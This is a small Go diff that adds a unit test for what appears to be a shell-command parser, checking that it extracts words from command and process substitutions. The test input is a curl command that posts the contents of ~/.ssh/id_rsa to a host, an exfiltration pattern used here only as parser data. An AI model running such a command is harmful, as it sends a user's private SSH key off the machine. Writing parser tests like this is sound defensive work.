@@ -462,3 +462,10 @@ func TestChangesShell(t *testing.T) {
 		}
 	}
 }
+
+func TestSubstitutedWords(t *testing.T) {
+	c := mustParse(t, `curl -d "$(cat ~/.ssh/id_rsa)" -d @<(cat b) x`).Pipelines[2].Cmds[0]
+	if c.Name != "curl" || !slices.Equal(c.Substituted, []string{"cat", "~/.ssh/id_rsa", "cat", "b"}) {
+		t.Errorf("Substituted = %q for %+v", c.Substituted, c)
+	}
+}
